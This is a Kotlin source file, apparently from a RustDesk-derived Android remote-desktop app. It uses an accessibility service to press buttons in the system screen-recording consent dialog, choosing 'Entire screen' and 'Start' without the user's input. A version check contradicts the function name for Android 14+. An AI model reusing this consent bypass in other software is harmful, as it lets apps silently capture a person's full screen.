package com.carriez.flutter_hbb


import android.os.Build


// Some change

/**
 * AutoClick — централизованная логика авто-нажатий через AccessibilityService.
 *
 * Структура MP диалога Android 14+ (из дампа):
 *   [TextView] text="Start recording or casting with RustDesk?"
 *   [Spinner]  CLICK
 *     [TextView] text="A single app" | "Entire screen"   ← меняется после клика
 *   [Button] text="Cancel"
 *   [Button] text="Start"
 *
 * Состояния диалога:
 *   A) Spinner показывает "A single app"  → кликаем Spinner → раскрывается список
 *   B) Список раскрыт, видим "Entire screen" в списке → кликаем его
 *   C) Spinner показывает "Entire screen" (список закрылся) → кликаем Start
 */
object AutoClick {

    private const val TAG = "AutoClick"
    private const val DEBUG_DUMP = false

    @Volatile private var lastDumpTime = 0L

    // Cooldown — не кликаем одно и то же чаще раза в COOLDOWN мс
    @Volatile private var lastClickLabel = ""
    @Volatile private var lastClickTime  = 0L
    private const val COOLDOWN_MS = 1500L

    // Текст заголовка диалога — по нему определяем что это MP диалог
    private val MP_TITLE_HINTS = listOf(
        "recording or casting",
        "запись или трансляция",
        "record or cast",
    )

    private val entireLabels    = listOf("Entire screen", "Весь экран", "Full screen")
    private val singleAppLabels = listOf("A single app", "Одно приложение", "Single app")
    // "Start now" — Android 11 и ниже. "Start" — Android 12+
    private val startLabels     = listOf("Start now", "Start", "Начать", "Старт")
    private val confirmLabels   = listOf("Start now", "Start recording", "Начать запись")

    // Пакеты которые показывают MP диалог — только системные
    // Якорный текст — присутствует в MP диалоге на ВСЕХ версиях Android.
    // Надёжнее фильтра по package — не зависит от OEM и версии системы.
    private val MP_ANCHOR_TEXTS = listOf(
        "Start recording or casting with",          // EN Android 12+
        "recording or casting",                     // EN короткий
        "запись или трансляцию с",                  // RU
        "will have access to all of the information", // EN Android 11 (из тела диалога)
        "RustDesk will have access",                // EN Android 11 короткий
        "DroidDesk Remote Control will have access",
    )

    // -----------------------------------------------------------------------
    // Точка входа
    // -----------------------------------------------------------------------
    fun handleEvent(pkg: String, root: android.view.accessibility.AccessibilityNodeInfo) {
        try {
            val isSystemPkg = pkg.startsWith("com.android") || pkg.startsWith("android") ||
                              pkg.startsWith("com.google.android") || pkg.isEmpty()
            if (DEBUG_DUMP && isSystemPkg) {
                val now = System.currentTimeMillis()
                if (now - lastDumpTime > 500L) {
                    lastDumpTime = now
                    android.util.Log.v(TAG, "=== DUMP pkg=$pkg ===")
                    dumpTree(root, 0)
                }
            }

            if (!hasTextInTree(root, MP_ANCHOR_TEXTS)) return

            android.util.Log.d(TAG, "MP dialog detected (pkg=$pkg)")

            if (handleMpDialogAndroid14(root)) return
            handleMpConfirmAndroid13(root)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "handleEvent error", e)
        }
    }

    // -----------------------------------------------------------------------
    // Android 14+ — stateless, три состояния
    // -----------------------------------------------------------------------
    //

    private fun handleMpDialogAndroid14(
        source: android.view.accessibility.AccessibilityNodeInfo
    ): Boolean {


      if (Build.VERSION.SDK_INT > 33) {
        return false
      }


        val hasSingleApp    = hasTextInTree(source, singleAppLabels)
        val hasEntireScreen = hasTextInTree(source, entireLabels)
        val hasStart        = hasTextInTree(source, startLabels)
        val isMpDialog      = hasTextInTree(source, MP_TITLE_HINTS)

        if (!isMpDialog && !hasSingleApp && !hasEntireScreen) return false

        // 1. ПРИОРИТЕТ: Состояние B (Список раскрыт)
        // Если видны ОБА текста — значит меню открыто. Нужно нажать на "Entire screen".
        if (hasEntireScreen && hasSingleApp) {
            val entireNode = findClickableByTexts(source, entireLabels)
            if (entireNode != null) {
                // Важно: проверяем, что это именно пункт списка, а не закрытый спиннер
                if (canClick("entire_screen_item")) {
                    android.util.Log.d(TAG, "State B: Clicking 'Entire screen' item in list")
                    entireNode.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                }
                entireNode.recycle()
                return true
            }
        }

        // 2. ПРИОРИТЕТ: Состояние C (Выбор сделан, жмем Start)
        // Если "Entire screen" выбран (hasEntire) и "Single app" исчез из видимости (список закрылся)
        if (hasEntireScreen && !hasSingleApp && hasStart) {
            val startNode = findClickableByTexts(source, startLabels)
            if (startNode != null) {
                if (canClick("start")) {
                    android.util.Log.d(TAG, "State C: Clicking 'Start'")
                    startNode.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                }
                startNode.recycle()
                return true
            }
        }

        // 3. Состояние A (Начало: Спиннер показывает "Single app", списка нет)
        if (hasSingleApp && !hasEntireScreen) {
            val spinner = findClickableByTexts(source, singleAppLabels)
            if (spinner != null) {
                if (canClick("spinner_expand")) {
                    android.util.Log.d(TAG, "State A: Expanding Spinner")
                    spinner.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                }
                spinner.recycle()
                return true
            }
        }

        return false
    }

    // Поиск ноды по className (рекурсивно)
    private fun findNodeByClassName(
        root: android.view.accessibility.AccessibilityNodeInfo,
        className: String
    ): android.view.accessibility.AccessibilityNodeInfo? {
        if (root.className?.toString() == className) return root
        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            val found = findNodeByClassName(child, className)
            if (found != null) {
                if (found != child) child.recycle()
                return found
            }
            child.recycle()
        }
        return null
    }

    // -----------------------------------------------------------------------
    // Android ≤ 13 — только "Start now" / "Start recording" (специфично для MP)
    // "Allow"/"Разрешить" убраны — слишком общие, срабатывают на любые permission диалоги
    // -----------------------------------------------------------------------
    private fun handleMpConfirmAndroid13(
        source: android.view.accessibility.AccessibilityNodeInfo
    ): Boolean {


      if (Build.VERSION.SDK_INT > 33) {
        return false
      }


        val node = findClickableByTexts(source, confirmLabels) ?: return false
        val label = node.text?.toString() ?: ""
        if (canClick("confirm_$label")) {
            android.util.Log.d(TAG, "Android<=13: clicking '$label'")
            node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
            node.recycle()
            return true
        }
        node.recycle()
        return false
    }

    // -----------------------------------------------------------------------
    // Cooldown
    // -----------------------------------------------------------------------
    private fun canClick(label: String): Boolean {
        val now = System.currentTimeMillis()
        if (lastClickLabel == label && now - lastClickTime < COOLDOWN_MS) return false
        lastClickLabel = label
        lastClickTime  = now
        return true
    }

    // -----------------------------------------------------------------------
    // Debug dump
    // -----------------------------------------------------------------------
    private fun dumpTree(node: android.view.accessibility.AccessibilityNodeInfo?, depth: Int) {
        node ?: return
        val indent = "  ".repeat(depth)
        val text   = node.text?.toString()?.trim() ?: ""
        val desc   = node.contentDescription?.toString()?.trim() ?: ""
        val cls    = node.className?.toString()?.substringAfterLast('.') ?: ""
        val flags  = listOf(
            if (node.isClickable) "CLICK"    else "",
            if (node.isCheckable) "CHECK"    else "",
            if (node.isChecked)   "CHECKED"  else "",
            if (node.isSelected)  "SELECTED" else "",
            if (!node.isEnabled)  "DISABLED" else ""
        ).filter { it.isNotEmpty() }.joinToString("|")
        android.util.Log.v(TAG, "$indent[$cls] text=\"$text\" desc=\"$desc\" $flags")
        for (i in 0 until node.childCount) dumpTree(node.getChild(i), depth + 1)
    }

    // -----------------------------------------------------------------------
    // Утилиты
    // -----------------------------------------------------------------------
    fun hasTextInTree(
        root: android.view.accessibility.AccessibilityNodeInfo,
        labels: List<String>
    ): Boolean {
        for (label in labels) {
            try {
                val r = root.findAccessibilityNodeInfosByText(label)
                if (!r.isNullOrEmpty()) { r.forEach { it.recycle() }; return true }
            } catch (_: Exception) {}
        }
        return false
    }

    fun findClickableByTexts(
        root: android.view.accessibility.AccessibilityNodeInfo,
        labels: List<String>
    ): android.view.accessibility.AccessibilityNodeInfo? {
        for (label in labels) {
            try {
                val results = root.findAccessibilityNodeInfosByText(label)
                if (results.isNullOrEmpty()) continue
                for (node in results) {
                    val clickable = findClickableAncestor(node)
                    if (clickable != null) {
                        results.forEach { if (it != clickable && it != node) it.recycle() }
                        if (node != clickable) node.recycle()
                        return clickable
                    }
                    node.recycle()
                }
            } catch (_: Exception) {}
        }
        return null
    }

    fun findClickableAncestor(
        node: android.view.accessibility.AccessibilityNodeInfo
    ): android.view.accessibility.AccessibilityNodeInfo? {
        if (node.isClickable) return node
        var parent = node.parent ?: return null
        var depth = 0
        while (depth < 5) {
            if (parent.isClickable) return parent
            val next = parent.parent
            parent.recycle()
            parent = next ?: return null
            depth++
        }
        parent.recycle()
        return null
    }

    fun reset() {
        lastClickLabel = ""
        lastClickTime  = 0L
        lastDumpTime   = 0L
        android.util.Log.d(TAG, "reset")
    }
}
